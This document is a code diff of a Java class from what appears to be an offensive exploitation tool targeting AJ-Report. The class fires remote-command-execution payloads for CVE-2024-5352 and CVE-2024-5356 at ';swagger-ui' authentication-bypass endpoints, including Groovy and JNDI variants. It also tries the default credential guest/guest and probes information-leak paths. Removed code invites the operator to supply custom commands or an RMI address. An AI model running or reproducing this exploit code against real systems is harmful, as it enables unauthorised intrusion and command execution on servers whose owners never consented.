@@ -1,203 +1,151 @@
 package com.liev.clouds.exp;
 
-import com.liev.clouds.dao.AjReportDetectionParams;
 import com.liev.clouds.payload.AjReportPayload;
 import com.liev.clouds.utils.DataUtils;
 import com.liev.clouds.dao.HttpResponse;
 import com.liev.clouds.utils.HttpUtils;
+import com.liev.clouds.webcontroller.framework.AJreportController;
 
 import java.util.*;
 
 public class AjReportExp {
 
-    /**
-     * 依次检测所有漏洞，会从高危到低危进行检测，检测到漏洞就返回
-     * @param params
-     */
-    public void processDetection(AjReportDetectionParams params) {
-
-        boolean rceExists = processRce(params);
-        if (rceExists) {
-            return;
-        }
-        boolean jsExpExists = processJsExp(params);
-        if (jsExpExists) {
-            return;
-        }
-        boolean sqlExists = processSql(params);
-        if (sqlExists) {
-            return;
-        }
-        boolean zipExists = processUploadZip(params);
-        if (zipExists) {
-            return;
-        }
-
-        params.getOutComeArea().appendText("未检测到漏洞！");
-    }
 
     /**
      * CVE-2024-5352(任意命令执行)
+     * @param url 基础 URL
+     * @param headers 请求头
+     * @param controller 控制器
      */
-    public boolean processRce(AjReportDetectionParams params) {
-        boolean exp = false;
-
-        try {
-            //特定请求头
-            Map<String, String> headers = new HashMap<>();
-            headers.put("Content-Type", "application/json;charset=UTF-8");
-
-            String trueUrl = params.getUrl().endsWith("/") ? params.getUrl() + "dataSetParam/verification;swagger-ui/" : params.getUrl() + "/dataSetParam/verification;swagger-ui/";
-
-            List<String> postDataList = params.getPostDataList();
-            if (postDataList != null) {
-                for (String postData : postDataList) {
-                    HttpResponse response = HttpUtils.sendPost(trueUrl, postData, headers);
-                    String formattedResponseBody = response.getResponseBody();
-
-                    // Display response without regex checking
-                    DataUtils.displayResponse(params.getPostTxt(), params.getResponseArea(), params.getOutComeArea(), postData, response, "请求发送成功");
-                }
-                return exp;
-            }
-
-            postDataList = Arrays.asList(AjReportPayload.RCE_EXP, AjReportPayload.GORRVY_EXP, AjReportPayload.JNDI_EXP);
-
-            for (String postData : postDataList) {
-                HttpResponse response = HttpUtils.sendPost(trueUrl, postData, headers);
-                String formattedResponseBody = response.getResponseBody();
-                int responseCode = response.getResponseCode();
-                if (postData.equals(AjReportPayload.RCE_EXP)) {
-                    if (!DataUtils.checkVulnerability(formattedResponseBody, "\"data\":\"(.*?)\"", "") && responseCode == 200) {
-                        exp = true;
-                        String result = "[+++]CVE-2024-5352任意命令执行漏洞存在!【√】 \n需要执行其它命令请勾选POST请求然后修改命令!";
-                        DataUtils.displayResponse(params.getPostTxt(), params.getResponseArea(), params.getOutComeArea(), postData, response, result);
-                        return exp;
-                    }
-                } else {
-                    if (DataUtils.checkVulnerability(formattedResponseBody, "\"code\":\"(.*?)\"", "4005")) {
-                        exp = true;
-                        String result = "[+++]CVE-2024-5352任意命令执行漏洞存在!【√】 \n请勾选自定义POST请求然后在POST请求中自定义您的命令或RMI地址!";
-                        DataUtils.displayResponse(params.getPostTxt(), params.getResponseArea(), params.getOutComeArea(), postData, response, result);
-                        return exp;
-                    }
-                }
-            }
-
-            params.getOutComeArea().appendText("[---]CVE-2024-5352任意命令执行漏洞不存在!");
-
-        } catch (Exception e) {
-            params.getOutComeArea().setText("检测过程中出现错误: " + e.getMessage());
-            e.printStackTrace();
+    public static void RCE_dataSetParam_verification(String url, Map<String, String> headers, AJreportController controller){
+        if (url.endsWith("/")) {
+            url = url.substring(0, url.length() - 1);
         }
 
-        return exp;
+        String urlTrue = url + "/dataSetParam/verification;swagger-ui/";
+        String[] payloads = {AjReportPayload.RCE_EXP, AjReportPayload.GORRVY_EXP, AjReportPayload.JNDI_EXP};
+
+        boolean vulnerabilityExists = false;
+
+        for (String payload : payloads) {
+            try {
+                HttpResponse response = HttpUtils.sendPost(urlTrue, payload, headers);
+                String responseBody = response.getResponseBody();
+
+                if ((response.getResponseCode() == 200 && !DataUtils.checkVulnerability(responseBody, "\"data\":\"(.*?)\"", "")) || DataUtils.checkVulnerability(responseBody, "\"code\":\"(.*?)\"", "4005")) {
+                    controller.log.appendText("[+++]CVE-2024-5352任意命令执行漏洞存在!【√】\n");
+                    controller.responseBody.appendText(DataUtils.formatJson(responseBody) + "\n\n\n");
+                    vulnerabilityExists = true;
+                    break;
+                }
+            } catch (Exception e) {
+                System.err.println("Error during HTTP request: " + e.getMessage());
+            }
+        }
+
+        // 如果没有检测到漏洞
+        if (!vulnerabilityExists) {
+            controller.log.appendText("[---]CVE-2024-5352任意命令执行漏洞存不存在！\n");
+        }
+
+
     }
 
     /**
      * CVE-2024-5356(任意命令执行)
+     * @param url 基础 URL
+     * @param headers 请求头
+     * @param controller 控制器
      */
-    public boolean processJsExp(AjReportDetectionParams params) {
-        boolean exp = false;
-
-        try {
-            String trueUrl = params.getUrl().endsWith("/") ? params.getUrl() + "dataSet/testTransform;swagger-ui/" : params.getUrl() + "/dataSet/testTransform;swagger-ui/";
-
-            Map<String, String> headers = new HashMap<>();
-            headers.put("Content-Type", "application/json;charset=UTF-8");
-
-            List<String> postDataList = params.getPostDataList();
-            if (postDataList != null) {
-                for (String postData : postDataList) {
-                    HttpResponse response = HttpUtils.sendPost(trueUrl, postData, headers);
-                    String formattedResponseBody = response.getResponseBody();
-
-                    // Display response without regex checking
-                    DataUtils.displayResponse(params.getPostTxt(), params.getResponseArea(), params.getOutComeArea(), postData, response, "请求发送成功");
-                }
-                return exp;
-            }
-
-            String postData = AjReportPayload.JS_EXP;
-
-            HttpResponse response = HttpUtils.sendPost(trueUrl, postData, headers);
-            String formattedResponseBody = response.getResponseBody();
-
-            if (DataUtils.checkVulnerability(formattedResponseBody, "\"code\":\"(.*?)\"", "4005")) {
-                exp = true;
-                String result = "[+++]CVE-2024-5356任意命令执行漏洞存在!【√】 \n请勾选自定义POST请求然后在POST请求中自定义您的命令!";
-                DataUtils.displayResponse(params.getPostTxt(), params.getResponseArea(), params.getOutComeArea(), postData, response, result);
-                return exp;
-            }
-
-            params.getOutComeArea().appendText("[---]CVE-2024-5356任意命令执行漏洞漏洞不存在!");
-
-        } catch (Exception e) {
-            params.getOutComeArea().setText("检测过程中出现错误: " + e.getMessage());
-            e.printStackTrace();
+    public static void RCE_dataSet_testTransform(String url, Map<String, String> headers, AJreportController controller){
+        if (url.endsWith("/")) {
+            url = url.substring(0, url.length() - 1);
         }
 
-        return exp;
-    }
-
-    // SQL Injection Detection
-    public boolean processSql(AjReportDetectionParams params) {
-        boolean exp = false;
+        String urlTrue = url + "/dataSet/testTransform;swagger-ui/";
+        boolean vulnerabilityExists = false;
 
         try {
-            List<String> postDataList = params.getPostDataList();
-            if (postDataList != null) {
-                for (String postData : postDataList) {
-                    Map<String, String> headers = new HashMap<>();
-                    headers.put("Content-Type", "application/json;charset=UTF-8");
+            HttpResponse response = HttpUtils.sendPost(urlTrue, AjReportPayload.JS_EXP, headers);
+            String responseBody = response.getResponseBody();
 
-                    String trueUrl = params.getUrl().endsWith("/") ? params.getUrl() + "dataSet/testTransform;swagger-ui/" : params.getUrl() + "/dataSet/testTransform;swagger-ui/";
-                    HttpResponse response = HttpUtils.sendPost(trueUrl, postData, headers);
-                    String formattedResponseBody = response.getResponseBody();
-
-                    // Display response without regex checking
-                    DataUtils.displayResponse(params.getPostTxt(), params.getResponseArea(), params.getOutComeArea(), postData, response, "请求发送成功");
-                }
-                return exp;
+            if (response.getResponseCode() == 200 && DataUtils.checkVulnerability(responseBody, "\"code\":\"(.*?)\"", "4005")) {
+                controller.log.appendText("[+++]CVE-2024-5356任意命令执行漏洞存在!【√】\n");
+                controller.responseBody.appendText(DataUtils.formatJson(responseBody) + "\n\n\n");
+                vulnerabilityExists = true;
             }
-
-            postDataList = Arrays.asList(AjReportPayload.SQL_EXP);
-
-            for (String postData : postDataList) {
-                Map<String, String> headers = new HashMap<>();
-                headers.put("Content-Type", "application/json;charset=UTF-8");
-
-                String trueUrl = params.getUrl().endsWith("/") ? params.getUrl() + "dataSet/testTransform;swagger-ui/" : params.getUrl() + "/dataSet/testTransform;swagger-ui/";
-                HttpResponse response = HttpUtils.sendPost(trueUrl, postData, headers);
-                String formattedResponseBody = response.getResponseBody();
-
-                // Assume the payload result processing here
-                if (formattedResponseBody.contains("SQL error")) {
-                    exp = true;
-                    String result = "SQL 信息泄露漏洞存在!";
-                    DataUtils.displayResponse(params.getPostTxt(), params.getResponseArea(), params.getOutComeArea(), postData, response, result);
-                    return exp;
-                }
-
-                params.getOutComeArea().appendText("漏洞不存在!");
-
-            }
-
         } catch (Exception e) {
-            params.getOutComeArea().setText("检测过程中出现错误: " + e.getMessage());
-            e.printStackTrace();
+            System.err.println("Error during HTTP request: " + e.getMessage());
         }
 
-        return exp;
+        if (!vulnerabilityExists) {
+            controller.log.appendText("[---]CVE-2024-5356任意命令执行漏洞存不存在！\n");
+        }
+
     }
 
-    // File Upload Vulnerability Detection
-    public boolean processUploadZip(AjReportDetectionParams params) {
-        boolean exp = false;
+    /**
+     * 弱口令
+     * @param url 基础 URL
+     * @param headers 请求头
+     * @param controller 控制器
+     */
+    public static void weak_password(String url, Map<String, String> headers, AJreportController controller){
+        if (url.endsWith("/")) {
+            url = url.substring(0, url.length() - 1);
+        }
 
-        // Implement the logic for zip file upload vulnerability check
-        // Currently, it is not implemented
+        String urlTrue = url + "/accessUser/login";
+        boolean vulnerabilityExists = false;
 
-        return exp;
+        try{
+            HttpResponse response = HttpUtils.sendPost(urlTrue, AjReportPayload.WEAK_PASSWORD, headers);
+            String responseBody = response.getResponseBody();
+
+            if (response.getResponseCode() == 200 && DataUtils.checkVulnerability(responseBody, "\"code\":\"(.*?)\"", "200")){
+                controller.log.appendText("[+++]AjReport存在弱口令 guest-guest !【√】\n");
+                controller.responseBody.appendText(DataUtils.formatJson(responseBody) + "\n\n\n");
+                vulnerabilityExists = true;
+            }
+        }catch (Exception e){
+            System.err.println("Error during HTTP request: " + e.getMessage());
+        }
+
+        if (!vulnerabilityExists) {
+            controller.log.appendText("[---]AjReport存在弱口令不存在！\n");
+        }
+    }
+
+    /**
+     * 信息泄露
+     * @param url 基础 URL
+     * @param headers 请求头
+     * @param controller 控制器
+     */
+    public static void information_leakage(String url, Map<String, String> headers, AJreportController controller){
+        if (url.endsWith("/")) {
+            url = url.substring(0, url.length() - 1);
+        }
+
+        String[] urlTrue = {url + "/;swagger-ui/gaeaDict/all", url + "/;swagger-ui/gaeaDict/select/SOURCE_TYPE"};
+        boolean vulnerabilityExists = false;
+
+        for (String urls : urlTrue){
+            try {
+                HttpResponse response = HttpUtils.sendGet(urls, headers);
+                String responseBody = response.getResponseBody();
+
+                if (response.getResponseCode() == 200 && DataUtils.checkVulnerability(responseBody, "\"code\":\"(.*?)\"", "200")) {
+                    controller.log.appendText("[+++]AjReport存在SQL信息泄露!【√】\n");
+                    controller.responseBody.appendText(DataUtils.formatJson(responseBody) + "\n\n\n");
+                    vulnerabilityExists = true;
+                }
+            } catch (Exception e) {
+                System.err.println("Error during HTTP request: " + e.getMessage());
+            }
+        }
+        if (!vulnerabilityExists) {
+            controller.log.appendText("[---]AjReport信息泄露不存在！\n");
+        }
     }
 }
